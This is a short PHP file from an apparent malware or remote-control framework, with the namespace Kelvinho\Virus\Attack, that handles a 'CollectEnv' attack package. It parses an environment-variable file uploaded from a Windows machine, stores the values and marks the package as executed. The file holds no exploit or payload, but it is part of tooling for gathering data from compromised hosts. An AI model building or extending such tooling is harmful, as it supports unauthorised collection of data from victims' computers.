<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectEnv;
use function Kelvinho\Virus\filter;

/** @var CollectEnv $this */

$lines = filter(explode("\n", $this->requestData->fileCheck("envFile")), fn($line) => !empty(trim($line)));
$data = [];
foreach ($lines as $line) {
    $contents = explode("=", $line);
    $data[$contents[0]] = explode(";", $contents[1]);
}

$this->setEnv($data);
$this->setExecuted();
$this->saveState();